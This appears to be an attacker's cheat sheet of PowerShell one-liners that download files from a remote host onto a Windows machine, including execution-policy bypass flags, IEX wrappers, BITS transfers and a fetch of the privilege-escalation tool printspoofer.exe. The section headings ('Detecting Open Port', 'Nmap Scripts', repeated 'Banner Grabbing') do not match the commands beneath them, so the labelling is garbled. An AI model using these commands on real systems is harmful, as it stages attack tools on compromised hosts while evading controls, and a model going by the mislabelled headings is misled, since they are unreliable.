USING POWERSHELL - 
------------------------------------------------------------------------------------------------------------------


#### Detecting Open Port
	
     powershell.exe -c (new-object System.Net.WebClient).DownloadFile('http://10.10.10.10/demo.txt','c:\demo.txt')

**Nmap Scripts**

       powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source 'http://192.168.1.143/1.txt' -Destination 'c:\temp\1.txt'"

**Banner Grabbing**
	
        $webClient.DownloadFile('http://192.168.1.143:80/1.txt','c:\temp\1.txt')

**Banner Grabbing**
	
        iwr -uri http://192.168.45.240/printspoofer.exe -Outfile printspoofer.exe

**Banner Grabbing**
	
        powershell.exe IEX(New-Object System.Net.WebClient).downloadFile('http://192.168.1.143:80/1.txt','C:\Users\public\1.txt')

**Banner Grabbing**
	
        powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile "IEX(New-Object System.Net.WebClient).downloadFile('http://192.168.1.143/1.txt','C:\temp\1.txt')"

**Banner Grabbing**
	
        echo IEX(New-Object System.Net.WebClient).downloadFile('http://192.168.1.143:80/1.txt','C:\Users\public\1.txt') | powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile

**Banner Grabbing**
	
        powershell.exe -c wget "http://10.10.14.17/1.txt" -outfile "c:\temp\1.txt"

**Banner Grabbing**
	
        powershell.exe -c "curl.exe http://192.168.1.143:80/1.txt c:\temp\1.txt"	

**Banner Grabbing**
	
        powershell.exe Invoke-RestMethod -Uri "http://192.168.1.143/1.txt" -OutFile "c:\temp\1.txt"

**Banner Grabbing**
	
        powershell.exe Invoke-webRequest -Uri "http://192.168.1.143/1.txt" -OutFile "c:\temp\1.txt"

**Banner Grabbing**
	
        echo '$storageDir = $pwd' > wget.ps1
        echo '$webclient = New-Object System.Net.WebClient' >> wget.ps1
        echo '$url = "http://192.168.1.143/1.txt"' >> wget.ps1
        echo '$file = "c:\temp\1.txt"' >> wget.ps1
        echo '$webclient.DownloadFile($url, $file)' >> wget.ps1

        powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
